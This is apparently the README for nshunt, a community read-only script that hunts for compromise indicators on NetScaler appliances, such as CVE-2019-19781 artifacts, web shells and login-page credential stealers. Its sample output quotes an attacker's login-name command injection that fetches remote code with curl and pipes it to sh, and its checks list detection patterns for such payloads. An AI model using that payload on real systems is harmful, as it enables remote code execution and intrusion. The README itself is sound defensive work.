# nshunt

A quick, read-only compromise hunt for NetScaler ADC / Gateway appliances.

Official IOC scanners produce long reports full of legitimate files. `nshunt.sh`
does the opposite: it prints **only findings**, grouped by how serious they are,
so a clean appliance produces a three-line result.

> This is an unofficial community tool. It is not affiliated with or endorsed by
> Cloud Software Group / Citrix. A clean result does not prove an appliance is
> uncompromised - it only means none of these specific indicators were found.

## Usage

Copy the script to the appliance and run it as `root` from the shell:

```sh
scp nshunt.sh nsroot@<netscaler-ip>:/tmp/
ssh nsroot@<netscaler-ip>
shell
sh /tmp/nshunt.sh
```

Or download it directly on an appliance with internet access:

```sh
curl -O https://raw.githubusercontent.com/kolbicz/nshunt/main/nshunt.sh
sh nshunt.sh
```

The script changes nothing on the appliance. It only creates a temporary
directory in `/tmp`, which it removes when it finishes. It needs nothing beyond
the tools every NetScaler ships with (`sh`, `find`, `grep`, `awk`, `gzip`, `ls`).

Copy it in **binary mode** (`scp`, or binary mode in WinSCP/FileZilla). If the
file picks up Windows line endings on the way, the script detects that and
prints the command to fix it.

## Output

Each finding is labelled:

| Label    | Meaning |
|----------|---------|
| `HIGH`   | Evidence that the appliance was, or may have been, compromised |
| `ATTACK` | Exploitation attempts found in the logs still on the appliance |
| `CHECK`  | Unusual, needs a human look - may well be legitimate |

Example:

```
NetScaler quick hunt 1.2 - ns01 - 2026-09-30 14:43

[HIGH] CVE-2019-19781 exploit files: this box was exploited (Jan 2020 wave)
       Jan 11 2020 16:04  /var/vpn/bookmark/pwnpzi1337.xml  (exploit file name)

[ATTACK] Shell commands sent in the VPN login name (command injection)
       203.0.113.10     3 attempt(s)  2026-09-29 07:28 .. 2026-09-29 13:31 UTC
         tried: pitboss PPE unexpectedly died NSPPE;U=http://203.0.113.10:8899/s;curl${IFS}$U|sh;# X
       Files the attacks tried to create:
         not present now (never created, or removed since): /var/netscaler/logon/LogonPoint/x.html
           web requests for /logon/LogonPoint/x.html: status 404 x12
       Check firewall logs for connections from the NetScaler to:
         http://203.0.113.10:8899/s

RESULT: 1 HIGH, 1 ATTACK, 0 CHECK.
Scanned: 24 bookmark files in /var/vpn/bookmark, 26 ns.log files, 5 web access log files (0 unreadable).
Log checks only see logs still on the box (back to Sep 29); older attacks need your syslog server.
```

### Exit codes

| Code | Meaning |
|------|---------|
| `0`  | No findings |
| `1`  | Findings |
| `2`  | Scan **incomplete** - a log could not be read, a check crashed, or a file system error occurred. Do not trust "no findings" with exit code 2. |

If a check crashes, it is reported as `[SKIPPED]` and the remaining checks still run.

## What it checks

1. **CVE-2019-19781 ("Shitrix") artifacts** - bookmark files in `/var/vpn/bookmark`
   with the public exploit's file name (`pwnpzi*`) or template code are `HIGH`.
   Bookmarks last modified during the January 2020 mass-exploitation wave are
   `CHECK`, labelled as empty stub or real bookmarks, because the date alone is
   not proof. Files owned by `nobody` in `/netscaler/portal/templates` are `HIGH`.
2. **Command injection through the VPN login** - failed logins and
   authentication requests in `ns.log*` whose user name contains shell syntax
   (`` ` ``, `${IFS}`, `$(`, `| sh`, `pitboss`). Summarised per attacker IP with
   the number of attempts, time range and payload, plus everything those IPs
   requested from the web server (status codes and successful URLs). For files the payload tried to create in a web folder it
   reports whether they exist now (`HIGH` if so) and how the web server answered
   requests for them. A successful (`2xx`) download is `HIGH` - for example an
   attack that packs `/flash/nsconfig` into a file in the login page and then
   downloads it. It also lists download URLs to look for in your firewall logs.
3. **Path-traversal probes carrying commands** - requests the NetScaler logged
   and blocked as `Path traversal detected` that contained `curl`, `wget` or
   command separators, per source IP.
4. **Web shells** - PHP, Perl, Python or shell scripts, or `<?php` / `<?=` code inside
   other files, in web folders outside the stock admin UI.
5. **Files written by the web server** - files owned by `nobody` in
   `/var/netscaler/logon`, `/var/netscaler/gui` and `/netscaler/ns_gui`.
6. **Hidden files** in web folders. The published web shell name
   `.ctxs.receiver` is `HIGH`.
7. **Credential stealers in the login page** - JavaScript that contains an
   external URL next to code that captures or sends data (`password`, `fetch(`,
   `XMLHttpRequest`, `sendBeacon`, `atob`, `new Image`, ...), anywhere in the
   file and across line breaks, plus HTML that loads scripts from external sites.
   Stock Citrix code only talks to `localhost` or relative paths and is not flagged.
8. **Unknown setuid/setgid programs** outside the standard system folders and
   the NetScaler's own `ping`/`traceroute`.
9. **User crontabs** in `/var/cron/tabs`.
10. **Unknown programs in temp folders** (`/tmp`, `/var/tmp`, `/var/nstmp`),
    excluding the NIC firmware tools and caches that NetScaler upgrades leave there.
11. **Web server config** (`/etc/httpd.conf`, `/flash/nsconfig/httpd.conf`) -
    PHP handlers for non-PHP files such as `.deb` or `.sig`, and aliases that map
    an image or CSS URL (e.g. `/vpn/media/<hex>.ico`, `receiver.min.css`) onto a
    hidden, `.sig` or `.deb` file are `HIGH` (WHIPSHOT persistence).
    `php_flag engine on` and commented-out protection lines are `CHECK`.
12. **Startup scripts** (`rc.netscaler`, `nsbefore.sh`, `nsafter.sh`) that run
    Python, base64 loaders, downloads or `chmod +s` at boot.
13. **Fake `.deb` packages** - `.deb` files in web folders that are not real
    packages (WHIPSHOT is a PHP web shell disguised as a `.deb`).
14. **Setuid shells** - `/bin/sh` or another shell or interpreter with the
    setuid/setgid bit, which gives web shells root.
15. **SLAPSHOT tunnel** - `/tmp/.uxdport`, `/tmp/.uxdlock` and running Python
    processes that execute base64 payloads.
16. **Web access logs** (`httpaccess*.log*`, including the Gateway's `httpaccess-vpn.log`) - requests for `<hex>.ico` / `.sig`
    web shell URLs, and `INDEX:<base64>` or base64-only User-Agents, shown
    decoded.
17. **Crash dumps** from the last 14 days in `/var/core` and `/var/crash` - failed
    exploits can crash the packet engine (NSPPE).
18. **Known attacker IP addresses** published by Mandiant, GreyNoise and
    Lupovis, in `ns.log*` and the web access logs, and in current connections.

## Limitations

- **Logs rotate quickly.** The log checks only see the `ns.log*` and
  `httpaccess*.log*` files still on the appliance, often just a day or two.
  Search your syslog server or SIEM for older attacks; the script prints how far
  back the local logs go.
- **A missing file does not prove an attack failed** - the attacker may have
  removed it. The script says "not present now", not "failed".
- **File dates are modification times.** They can be changed and do not show
  when a file was created.
- **Heuristics.** The JavaScript check can miss well-hidden code and can flag
  harmless files. Compare a flagged file against the same file on another
  appliance running the same build.
- **Patching does not remove a past compromise.** If the appliance was ever
  compromised, rebuild it from a fresh install and rotate the `nsroot` password,
  LDAP bind passwords and certificate private keys.

## Testing on a copy

`NSHUNT_ROOT` prefixes every path the script reads, so it can scan a copied or
mounted file system instead of the live appliance:

```sh
NSHUNT_ROOT=/mnt/netscaler-image sh nshunt.sh
```

## License

[MIT](LICENSE)
